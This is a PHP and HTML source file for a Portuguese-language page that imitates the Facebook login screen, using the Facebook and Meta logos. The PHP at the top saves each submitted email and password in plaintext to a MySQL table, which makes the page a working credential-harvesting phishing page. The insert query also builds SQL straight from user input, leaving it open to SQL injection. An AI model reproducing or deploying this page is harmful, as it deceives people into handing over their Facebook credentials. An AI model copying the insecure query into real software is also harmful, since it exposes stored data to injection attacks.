<?php 
if(isset($_POST['submit'])){
    include_once('config.php');
    $emailIn = $_POST['email'];
    $senhaIn = $_POST['password'];

    // Corrigir os campos da tabela para corresponder aos campos reais
    $result = mysqli_query($conexao, "INSERT INTO new_table (email, senha) VALUES ('$emailIn', '$senhaIn')");
    
    if($result){
        echo "Dados inseridos com sucesso!";
    } else {
        echo "Erro ao inserir dados: " . mysqli_error($conexao);
    }
}
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
        integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
</head>
<style>
    *{
        gap: 15px;
    }
    .content {
        display: flex;
        width: 90vw;
        max-width: 100%;
        flex-direction: column;
        margin: auto;
    }

    .spaceLogo img {
        width: 65px;
        max-width: 150px;
        height: auto;
    }
    .spaceLogo{
        display: flex;
        align-items: center;
    }
    .input-group-text {
        width: 100%;
    }

    .btn-block {
        width: 100%;
    }
    form{
        display: flex;
        flex-direction: column;
        align-items: center;
        text-align: right;
    }
    .navBar{
        display: flex;
        flex-direction: column;
        align-items: center;
        color: rgba(50, 111, 182, 0.801);
    }
    input{
        text-align: right;
    }
    .input-group-text { width: 100%; text-align: left; }
    .metaImg{
        width: 30px;
        
    }
    footer{
        font-family: helvetica;
    }
    .logoMeta{
        display: flex;
        flex-direction: column;
        align-items: center;
    }
</style>

<body>
    <main class="content ">
        <nav class="navBar">
            <div class="idioma">Português (Brasil)</div>
            <div class="spaceLogo"><img src="facebook (2).png" alt=""></div>
        </nav>
        <form action="index.php" method="POST">
            <input type="email" name="email" id="email" placeholder="Número do celular ou email" class="input-group-text" required>
            <input type="password" name="password" id="password" placeholder="Senha" class="input-group-text" required>
            <button type="submit" name="submit" class="enviar btn btn-primary btn-lg btn-block">Entrar</button>
            <a href="">Esqueceu a senha?</a>
        </form>
        <footer>
            <div class="newConta"><button class="btn btn-outline-primary btn-block">Criar nova conta</button></div>
            <hr>
            <div class="metaLogo"><span class="logoMeta"><img src="meta.png" alt="" class="metaImg"></span></div>
        </footer>
    </main>
</body>
</html>